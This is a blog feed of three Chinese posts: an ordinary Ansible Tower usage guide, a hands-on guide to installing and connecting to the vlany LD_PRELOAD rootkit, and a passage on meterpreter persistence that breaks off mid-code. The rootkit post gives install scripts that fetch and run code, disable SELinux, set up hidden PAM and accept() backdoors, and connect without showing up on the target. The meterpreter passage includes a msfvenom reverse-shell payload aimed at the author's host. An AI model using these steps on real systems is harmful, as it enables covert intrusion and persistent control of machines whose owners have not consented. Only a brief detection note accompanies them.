<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>ansible tower 实战使用详解</title>
      <link href="/2018/11/21/tower-useage/"/>
      <url>/2018/11/21/tower-useage/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-001.jpg" alt="kionf"></p><blockquote class="blockquote-center"><p>ansible tower 3.3.1 实战使用，此文档为进阶使用不是网上烂大街的安装部署，如需安装配置介绍移步<a href="https://kionf.com/2017/07/24/linux-tower">ansible-tower安装及破解</a>前几年就了解过tower那时使用感觉他的点子骚，但使用不是特别方便。经过3.0大改版后，用着很舒坦！！</p></blockquote><a id="more"></a><p><br></p><h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>关于Ansible Tower 这里不多介绍，属于发布配置管理系统，支持Api及界面操作，Django编写。<strong>☝️字屌</strong></p><figure class="highlight plain"><figcaption><span class="caption">实验环境</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">CentOS Linux release 7.4.1708</div><div class="line">Ansible Tower 3.3.1</div><div class="line">下载地址： https://releases.ansible.com/ansible-tower/setup/</div><div class="line">参考文档：https://docs.ansible.com/ansible-tower/latest/html/</div></pre></div></div></figure><p>关于新版导航栏介绍</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line"># viewes</div><div class="line">Dashboard           仪表盘展示信息的</div><div class="line">Jobs                跑过的任务记录</div><div class="line">Schedules           计划任务</div><div class="line">My View             查看用户的工作模版，和任务记录</div><div class="line"></div><div class="line"># resources</div><div class="line">Templates           任务模版，配置调用playbook执行时的各种参数，从此处添加计划任务</div><div class="line">Credentials         配置连接 机器/云主机api Key/自定义的凭证类型 的账号密码等信息</div><div class="line">Projects            这里配置项目对应的playbook，可以从Git上拉取或从本地文件夹读取playbook</div><div class="line">Inventories         资产清单</div><div class="line">Inventory Scripts   自定义获取资产清单的脚本</div><div class="line"></div><div class="line"># access</div><div class="line">Organizations       组织管理</div><div class="line">Users               用户管理</div><div class="line">Teams               用户组管理</div><div class="line"></div><div class="line"># Administration</div><div class="line">Credential Types    自定义凭证类型，添加后可在Credentials中使用</div><div class="line">Notifications       配置任务通知，支持电子邮件，Twillio电话等</div><div class="line">Management Jobs     计划任务管理</div><div class="line">Instance Groups     资产组管理</div><div class="line">Applications        自定义应用</div><div class="line">Settings            设置</div></pre></div></div></figure><blockquote><p>初始流程：从<code>Inventories</code>添加主机 &gt; <code>Credentials</code>添加连接机器密码/添加git账号（用来Projects从Git拉取Playbook） &gt; <code>Projects</code>配置playbook获取方式 &gt; <code>Templates</code>指定那些机器跑Playbook，和运行时的参数</p></blockquote><hr><h1 id="0x01-如何批量导入资产"><a href="#0x01-如何批量导入资产" class="headerlink" title="0x01 如何批量导入资产"></a>0x01 如何批量导入资产</h1><p>新版本的ansible-tower非常强大，笔者相信他一定能站起来。关于资产的导入<code>ansible tower</code>内部支持从云厂商或者私有虚拟化云直接导入机器，如果你使用的云厂商不支持，还可自己编写python/shell脚本来调用云厂商API添加到<code>ansible tower</code>资产中。抓紧 Let’s Go</p><h2 id="1-通过UI界面导入"><a href="#1-通过UI界面导入" class="headerlink" title="1. 通过UI界面导入"></a>1. 通过UI界面导入</h2><p>点击<code>Inventories</code>点击添加按钮，会提示出两种<code>Inventory</code>：<code>Inventory 正常的资产</code>， <code>Smart Inventory 根据从Inventory筛选条件变化的</code></p><h3 id="1）添加Inventory"><a href="#1）添加Inventory" class="headerlink" title="1）添加Inventory"></a>1）添加Inventory</h3><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-002.jpg" alt="Inventory"></p><p>保存后在点击<code>HOSTS</code>添加主机</p><h3 id="2）添加Smart-Inventory"><a href="#2）添加Smart-Inventory" class="headerlink" title="2）添加Smart Inventory"></a>2）添加Smart Inventory</h3><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-003.jpg" alt="smart Inventory"></p><p>Smart Inventory 是通过筛选IP/主机名称/id范围 来定义的主机清单</p><h2 id="2-通过命令行tower-manage批量添加主机"><a href="#2-通过命令行tower-manage批量添加主机" class="headerlink" title="2. 通过命令行tower-manage批量添加主机"></a>2. 通过命令行<code>tower-manage</code>批量添加主机</h2><p>通过Tower自带的命令行工具<code>tower-manage</code>来批量导入主机，可以从主机的<code>/etc/ansible/hosts</code>中直接导入</p><figure class="highlight yaml"><figcaption><span class="caption">示例文件</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="string">[test:children]</span></div><div class="line"><span class="string">test-signal</span></div><div class="line"><span class="string">test-mysql</span></div><div class="line"><span class="string">test-rtc</span></div><div class="line"><span class="string">test-tomcat</span></div><div class="line"></div><div class="line"><span class="string">[test-rtc]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.193</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.189</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.187</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-mysql]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.186</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.185</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-signal]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.190</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.191</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.197</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.198</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-tomcat]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.184</span> <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.188</span> <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-nginx]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.191</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.190</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">命令导入到资产清单</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">tower-manage inventory_import --source=/etc/ansible/hosts --group-filter=test --inventory-name=测试环境 --keep-vars</div><div class="line"></div><div class="line"></div><div class="line">    1.569 INFO     Updating inventory 7: 测试环境</div><div class="line">    1.674 INFO     Reading Ansible inventory source: /etc/ansible/hosts</div><div class="line">    3.003 INFO     Processing JSON output...</div><div class="line">    3.004 INFO     Loaded 7 groups, 11 hosts</div><div class="line">    3.292 INFO     Inventory import completed for  (测试环境 - 17) in 1.7s</div></pre></div></div></figure><p><strong>选项介绍：</strong></p><figure class="highlight shell"><div class="figcode"><div class="code"><pre><div class="line">--source            指定inventory文件</div><div class="line">--group-filter      从文件中通过组名过滤</div><div class="line">--host-filter       通过host name过滤</div><div class="line">--inventory-name    导入到指定名称资产清单</div><div class="line">--inventory-id      导入到指定ID的资产清单</div><div class="line"><span class="meta">#</span><span class="bash"> name 和 id 选一个</span></div><div class="line"></div><div class="line">--overwrite         覆盖主机和组，默认不覆盖</div><div class="line">--overwrite-vars    覆盖主机变量</div><div class="line">--keep-vars         保持主机变量</div><div class="line"></div><div class="line">--enabled-value     导入的主机状态是否激活默认激活</div></pre></div></div></figure><p><strong>导入结果</strong></p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-004.jpg" alt="tower-manage"></p><h2 id="3-导入云厂商主机"><a href="#3-导入云厂商主机" class="headerlink" title="3. 导入云厂商主机"></a>3. 导入云厂商主机</h2><div class="note danger"><p>暂未使用😂</p></div><hr><h1 id="0x02-创建凭证"><a href="#0x02-创建凭证" class="headerlink" title="0x02 创建凭证"></a>0x02 创建凭证</h1><p>可以创建各种各样的凭证，连接云厂商Api的凭证/连接gitlab的凭证/连接Linux主机的凭证/自定义的凭证等等。。我们先创建一个Gitlab认证用来拉取我们的Playbook</p><h2 id="1-创建版本控制凭证"><a href="#1-创建版本控制凭证" class="headerlink" title="1. 创建版本控制凭证"></a>1. 创建版本控制凭证</h2><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-005.jpg" alt="tower-manage"></p><p><code>Credential Type</code>选择<code>Source Control</code> </p><h2 id="2-创建登陆机器凭证"><a href="#2-创建登陆机器凭证" class="headerlink" title="2. 创建登陆机器凭证"></a>2. 创建登陆机器凭证</h2><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-006.jpg" alt="tower-manage"></p><p><code>Credential Type</code> 选择 <code>Machine</code></p><hr><h1 id="0x03-创建项目"><a href="#0x03-创建项目" class="headerlink" title="0x03 创建项目"></a>0x03 创建项目</h1><p><code>playbook</code>拉取的方式主要有：</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">- Manual        从本地目录读取</div><div class="line">- Git           从Git拉取</div><div class="line">- Mercurial     从mer</div><div class="line">- SVN</div><div class="line">- RedHatInsights</div></pre></div></div></figure><p>这里选用Git从Gitlab上拉取</p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-007.jpg" alt="tower-manage"></p><p>Options选项配置：</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">- Clean </div><div class="line">在从gitlab拉取前清除本地修改的playbook</div><div class="line">- Delete on Update </div><div class="line">当更新时删除所有本地储存playbook</div><div class="line">- Update Revision on Launch </div><div class="line">当Templates任务运行时，自动从git拉取更新</div></pre></div></div></figure><p>tower 测试playbook地址：<a href="https://github.com/ansible/tower-example.git" target="_blank" rel="noopener">tower-example</a></p><hr><h1 id="0x04-创建任务模板"><a href="#0x04-创建任务模板" class="headerlink" title="0x04 创建任务模板"></a>0x04 创建任务模板</h1><p>最后一步来了,创建<code>Templates</code></p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-008.jpg" alt="tower-templates"></p><p>Options选项配置：</p><figure class="highlight shell"><div class="figcode"><div class="code"><pre><div class="line">- Enable Privilege Escalation </div><div class="line"><span class="meta">#</span><span class="bash"> 默认脚本以awx用户执行playbook，开启后使用管理员身份</span></div><div class="line">- Allow Provisioning Callbacks </div><div class="line"><span class="meta">#</span><span class="bash"> 运行通过url回调来启动这个任务</span></div><div class="line">- Enable Concurrent Jobs </div><div class="line"><span class="meta">#</span><span class="bash"> 允许相同任务一起运行</span></div><div class="line">- Use Fact Cache </div><div class="line"><span class="meta">#</span><span class="bash"> 使用缓存</span></div></pre></div></div></figure><p> 点击<code>SCHEDULES</code>可以添加计划任务</p><hr><h1 id="0x05-完结"><a href="#0x05-完结" class="headerlink" title="0x05 完结"></a>0x05 完结</h1><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-009.jpg" alt="tower-templates"></p><p>我相信Tower会站起来😂，后续再补充。</p><p><strong> 参考：</strong></p><blockquote><p><a href="https://docs.ansible.com/ansible-tower/latest/html/" target="_blank" rel="noopener">https://docs.ansible.com/ansible-tower/latest/html/</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> ansible tower </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible-Tower </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux动态链接库预加载型后门，Vlany安装及分析</title>
      <link href="/2018/10/25/rookit-vlany/"/>
      <url>/2018/10/25/rookit-vlany/</url>
      <content type="html"><![CDATA[<script id="asciicast-QDmzYWjPylDMA0gyMlSR0xvbx" src="https://asciinema.org/a/QDmzYWjPylDMA0gyMlSR0xvbx.js" async></script><blockquote class="blockquote-center"><p>此工具<strong><a href="https://github.com/mempodippy/vlany" title="vlany Github" target="_blank" rel="noopener">vlany</a></strong>通过<code>LD_PRELOAD</code>环境变量和/etc/ld.so.preload的配置文件来重写系统调用函数，加载攻击者自定义的恶意函数。</p></blockquote><a id="more"></a><h1 id="0x00-工具原理分析"><a href="#0x00-工具原理分析" class="headerlink" title="0x00 工具原理分析"></a>0x00 工具原理分析</h1><p>  预加载动态连接库这种利用技术，在早些年国外就已经有过利用相关的文章。只是近年国内恶意软件利用频繁被各大安全厂商捕获分析，也就渐渐公布在大众眼前。对于这种利用的大概原理，已有文章做了深入分析，这里就不重复造轮。文章地址：<a href="http://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">警惕利用Linux预加载型恶意动态链接库的后门</a></p><hr><h1 id="0x01-下载项目"><a href="#0x01-下载项目" class="headerlink" title="0x01 下载项目"></a>0x01 下载项目</h1><figure class="highlight sh"><figcaption><span class="caption">实验环境</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">CentOS-6.9  内核：2.6.32-696.el6.x86_64    架构：x86_64</div><div class="line marked">Kali-2018   内核：4.17.0-kali1-amd64       架构：x86_64 <span class="comment">#不支持</span></div></pre></div></div></figure><p><br></p><p>编辑文件<code>quick_install.sh</code>：</p><figure class="highlight sh"><figcaption><span class="caption">后门安装脚本</span><a href="https://github.com/mempodippy/vlany" target="_blank">项目地址</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line">[ $(id -u) != 0 ] &amp;&amp; &#123; <span class="built_in">echo</span> <span class="string">"Not root. Exiting."</span>; <span class="built_in">exit</span>; &#125;</div><div class="line"></div><div class="line">WORKING_DIR=<span class="string">"/tmp/.<span class="variable">$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)</span>"</span></div><div class="line">ARCHIVE_NAME=<span class="string">"<span class="variable">$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)</span>.tar.gz"</span></div><div class="line"></div><div class="line">mkdir <span class="variable">$WORKING_DIR</span> &amp;&amp; <span class="built_in">cd</span> <span class="variable">$WORKING_DIR</span></div><div class="line">wget https://github.com/mempodippy/vlany/archive/master.tar.gz -O <span class="variable">$ARCHIVE_NAME</span></div><div class="line">tar xvpfz <span class="variable">$ARCHIVE_NAME</span> &amp;&amp; rm <span class="variable">$ARCHIVE_NAME</span></div><div class="line"><span class="built_in">cd</span> vlany-master</div><div class="line">chmod +x install.sh</div><div class="line marked">./install.sh</div><div class="line"></div><div class="line">rm -rf <span class="variable">$WORKING_DIR</span></div><div class="line"><span class="comment">#下载完后删除项目</span></div><div class="line">rm -f <span class="variable">$0</span></div><div class="line"><span class="comment">#执行后删除自身脚本</span></div></pre></div></div></figure><hr><h1 id="0x02-编译安装"><a href="#0x02-编译安装" class="headerlink" title="0x02 编译安装"></a>0x02 编译安装</h1><div class="note danger"><p><code>quick_install.sh</code>下载项目后解压调用<code>install.sh</code>脚本，首先会检测SElinux是否关闭如果没关闭，脚本会关闭SElinux。此时需要重启机器。</p></div><p>实际应用中，如果不想重启机器，可以单独下载项目执行命令<br><code>wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-master</code><br>重新建立终端，然后输入<code>setenforce 0</code>，再更改<code>install.sh</code>脚本</p><figure class="highlight sh"><figcaption><span class="caption">install</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line">    <span class="keyword">if</span> [[ $(sestatus -v | head -n 1) == *<span class="string">"enabled"</span>* ]]; <span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"SELinux is still enabled. Reboot."</span></div><div class="line diff-deletion">        <span class="built_in">exit</span> <span class="comment"># 注释此行</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"SELinux is disabled."</span></div><div class="line">    <span class="keyword">fi</span></div></pre></div></div></figure><p>检验完SElinux，程序出现提示框选在grub配置位置，来确认当机器重启后 后门依然生效。根据机器实际情况填写，默认<code>/etc/grub.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">Enter location of bootloader config file (<span class="keyword">if</span> grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]:</div></pre></div></div></figure><p>然后一路回车，等待<code>gcc</code>等依赖安装完成，出现如下界面。选择是编译并安装，还是只编译，我们这里选在<code>YES</code></p><p><img src="https://kionf.com/article_images/vlany/vlany-01.jpg" alt="vlany-01"></p><h2 id="1-配置PAM后门"><a href="#1-配置PAM后门" class="headerlink" title="1. 配置PAM后门"></a>1. 配置PAM后门</h2><p>再一路回车，到如下界面。设置通过<code>ssh</code>连接的PAM用户名，<strong>记住此后门用户名</strong></p><p><img src="https://kionf.com/article_images/vlany/vlany-02.jpg" alt="vlany-02"></p><p>然后设置PAM密码，这里输入密码不会回显任何东西，继续输入就ok</p><p><img src="https://kionf.com/article_images/vlany/vlany-03.jpg" alt="vlany-03"></p><p>设置PAM端口，也是需要隐藏的端口</p><p><img src="https://kionf.com/article_images/vlany/vlany-04.jpg" alt="vlany-04"></p><h2 id="2-配置accept-后门"><a href="#2-配置accept-后门" class="headerlink" title="2. 配置accept()后门"></a>2. 配置<code>accept()</code>后门</h2><p>设置连接是否使用<code>SSL</code>加密，这测试选择<code>NO</code></p><p><img src="https://kionf.com/article_images/vlany/vlany-05.jpg" alt="vlany-05"></p><p>设置<code>accept()</code>后门密码，一样没有回显。</p><p><img src="https://kionf.com/article_images/vlany/vlany-06.jpg" alt="vlany-06"></p><p>设置<code>accept()</code>后门隐藏端口</p><p><img src="https://kionf.com/article_images/vlany/vlany-07.jpg" alt="vlany-07"></p><p>设置<code>execve()</code>密码，然后再再再一路回车，出现如下界面，是否删除编译项目的路径。</p><p><img src="https://kionf.com/article_images/vlany/vlany-08.jpg" alt="vlany-08"></p><p>完成后，脚本会提示是否安装作者新研究的<code>snodew</code>后门这里选择<code>NO</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (<span class="keyword">case</span>-sensitive) [YES]:</div></pre></div></div></figure><h2 id="3-连接信息"><a href="#3-连接信息" class="headerlink" title="3. 连接信息"></a>3. 连接信息</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ssh连接PAM用户名</span></div><div class="line">PAM backdoor username: ***REMOVED***</div><div class="line"></div><div class="line"><span class="comment">#PAM端口</span></div><div class="line">Hidden PAM port: 4397</div><div class="line"></div><div class="line"><span class="comment">#accept后门随机端口号</span></div><div class="line">accept backdoor low port: 271</div><div class="line">accept backdoor high port: 274</div><div class="line"></div><div class="line"><span class="comment">#后门位置</span></div><div class="line">Hidden directory: /lib/libc.so.***REMOVED***.14</div><div class="line"></div><div class="line"><span class="comment">#变量</span></div><div class="line">Environment variable: UVRTBKAYCLWI</div></pre></div></div></figure><p>全部配置完成后，会呈现出如上连接信息</p><hr><h1 id="0x03-连接后门"><a href="#0x03-连接后门" class="headerlink" title="0x03 连接后门"></a>0x03 连接后门</h1><h2 id="1-PAM后门连接"><a href="#1-PAM后门连接" class="headerlink" title="1. PAM后门连接"></a>1. PAM后门连接</h2><figure class="highlight shell"><figcaption><span class="caption">ssh</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Small bash script designed to allow easy connection to hidden PAM backdoors.</span></div><div class="line"><span class="meta">#</span><span class="bash"> Gets copied to your hidden directory <span class="keyword">in</span> <span class="keyword">case</span> you want to route through more</span></div><div class="line"><span class="meta">#</span><span class="bash"> than one rooted box. :)</span></div><div class="line"></div><div class="line">usage () &#123; echo "$0 &lt;PAM backdoor username&gt; &lt;host&gt; &lt;hidden PAM port&gt;"; exit; &#125;</div><div class="line"></div><div class="line">[ -z $1 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $2 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $3 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ ! -f /usr/bin/socat ] &amp;&amp; &#123; echo "socat isn't installed. exiting."; exit; &#125;</div><div class="line"></div><div class="line">echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"</div><div class="line">read -p "Press enter to continue"</div><div class="line">ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1"</div></pre></div></div></figure><p>使用其他机器连接后门，编辑文件<code>ssh.sh</code>。</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh ssh.sh ***REMOVED*** 192.168.10.35 4397</div></pre></div></div></figure><p>连接成功</p><p><img src="https://kionf.com/article_images/vlany/vlany-09.jpg" alt="vlany-09"></p><p>在被攻击端查看是否有异常连接，完全隐藏没有显示出任何连接信息，并且查看<code>/etc/passwd</code>文件，没有我们所使用的<code>***REMOVED***</code>用户</p><p><img src="https://kionf.com/article_images/vlany/vlany-10.jpg" alt="vlany-10"></p><div class="note danger"><p>注意：<strong>如果不使用<code>ssh.sh</code>脚本连接pam后门，直接使用ssh连接。被攻击端会查看到ssh连接信息</strong></p></div><h2 id="2-accept-后门连接"><a href="#2-accept-后门连接" class="headerlink" title="2. accept()后门连接"></a>2. accept()后门连接</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#accept backdoor low port: 271</span></div><div class="line"><span class="comment">#accept backdoor high port: 274</span></div><div class="line"><span class="comment"># -p 指定 271-274 范围内端口</span></div><div class="line">nc 192.168.10.35 22 -p 271</div><div class="line"><span class="comment">#输入设定的accept密码后回车</span></div><div class="line">***REMOVED***</div><div class="line"> [+] shell dropped</div></pre></div></div></figure><p><strong>accept()后门在实际测试中没有成功，由于内核版本等问题。</strong></p><hr><h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/mempodippy/detect_preload.git &amp;&amp; cd detect_preload &amp;&amp; ./detect_preload</div></pre></div></div></figure><p>执行以上小程序查看输出</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">[+] finished basic checks</div><div class="line"></div><div class="line">0x7f0144ca2000 /lib64/libdl.so.2</div><div class="line">0x7f014490a000 /lib64/libc.so.6</div><div class="line">0x7f01446ca000 /lib64/libcrypt.so.1</div><div class="line marked">(nil) /lib64/ld-linux-x86-64.so.2</div><div class="line">0x7f01444c2000 /lib64/libfreebl3.so</div></pre></div></div></figure><p>此程序获取动态连接库信息，<code>ld-linux-x86-64.so.2</code> 无法获取，存在后门。此rookit清理只能替换被修改的恶意动态链接库</p><blockquote><p>参考：<br>  <a href="https://raw.githubusercontent.com/mempodippy/vlany/master/README_old" target="_blank" rel="noopener">vlany_readme_file</a><br>  <a href="http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/" target="_blank" rel="noopener">系统函数</a><br>  <a href="https://github.com/mempodippy/vlany/wiki/Features" target="_blank" rel="noopener">vlany_wiki</a></p></blockquote><p>👿</p>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> Rookit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rookit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于 meterpreter 持久化问题研究</title>
      <link href="/2018/09/13/metasploit-presistence/"/>
      <url>/2018/09/13/metasploit-presistence/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>meterperter 获取到Session时如果当前session退出，就不会在自动连接，使用常见持久化也只是在远程用户登录，或者远程机器重启时才会返回session。今天主要介绍<code>persistence</code>脚本的自定义配置，来实现如果session断开，客户端定时重新尝试连接服务端(msf端)</p></blockquote><a id="more"></a><h1 id="0x00-建立连接"><a href="#0x00-建立连接" class="headerlink" title="0x00 建立连接"></a>0x00 建立连接</h1><p>服务端启动msf并监听端口等待session</p><figure class="highlight sh"><figcaption><span class="caption">后台监听端口</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">msf&gt; handler -p windows/meterpreter/reverse_tcp -H 0.0.0.0 -P 33333</div><div class="line"></div><div class="line">msf&gt; <span class="built_in">jobs</span></div><div class="line"></div><div class="line">Jobs</div><div class="line">====</div><div class="line"></div><div class="line">  Id  Name                    Payload                          Payload opts</div><div class="line">  --  ----                    -------                          ------------</div><div class="line">  5   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:33333</div></pre></div></div></figure><p>生成后门文件客户端执行建立连接:</p><figure class="highlight sh"><figcaption><span class="caption">不免杀，本文不做介绍</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">msf&gt; msfvenom -p  windows/meterpreter/reverse_tcp lhost=b1g-d1ck.kionf.com lport=33333 -f exe &gt; scvhost.exe</div><div class="line"><span class="comment"># lhost为远程主机</span></div><div class="line"><span class="comment"># lport为远程主机端口</span></div></pre></div></div></figure><p><img src="https://kionf.com/article_images/meterpreter-01.jpg" alt="kionf"></p><p>获取到客户端<code>session</code>,指定session id 进入meterpreter会话</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">msf&gt; session -i 6</div><div class="line"></div><div class="line">[*] Starting interaction with 6...</div><div class="line"></div><div class="line">meterpreter &gt;</div></pre></div></div></figure><hr><h1 id="0x01-persistence脚本持久化"><a href="#0x01-persistence脚本持久化" class="headerlink" title="0x01 persistence脚本持久化"></a>0x01 persistence脚本持久化</h1><p><br></p><p>当使用<code>run persistence</code>进行持久化时默认远程路径会推送到<code>%TEMP%</code>(“c:\users\appdata\local\temp\“)。当用户重启或者temp目录下存在数字id，<code>persistence</code>持久化就会出错。</p><div class="note danger"><p>metasploit 新版本已不推荐使用此脚本，并且使用<code>run persistence -h</code> 查看选项信息时会报错，所以分析直接脚本文件</p></div><blockquote><p>分析<code>persistence</code>ruby脚本文件<code>/usr/share/metasploit-framework/scripts/meterpreter/persistence.rb</code></p></blockquote><p>vim打开<code>:set nu</code>显示行号，根据名称可自行分析更改配置</p><figure class="highlight ruby"><figcaption><span class="caption">代码片段，此代码段为默认配置</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="number">14</span> key = <span class="string">"HKLM"</span></div><div class="line"><span class="number">15</span></div><div class="line"><span class="number">16</span> <span class="comment"># Default parameters for payload</span></div><div class="line"><span class="number">17</span> rhost = Rex::Socket.source_address(<span class="string">"b1g-d1ck.kionf.com"</span>)</div><div class="line"><span class="number">18</span> rport = <span class="number">33333</span></div><div class="line"><span class="number">19</span> delay = <span class="number">10</span></div><div class="line"><span class="number">20</span> install = <span class="literal">false</span></div><div class="line"><span class="number">21</span> autoconn = <span class="literal">false</span></div><div class="line"><span class="number">22</span> serv = <span class="literal">false</span></div><div class="line"><span class="number">23</span> altexe = <span class="literal">nil</span></div><div class="line"><span class="number">24</span> target_dir = <span class="literal">nil</span></div><div class="line"><span class="number">25</span> payload_type = <span class="string">"windows/meterpreter/reverse_tcp"</span></div><div class="line"><span 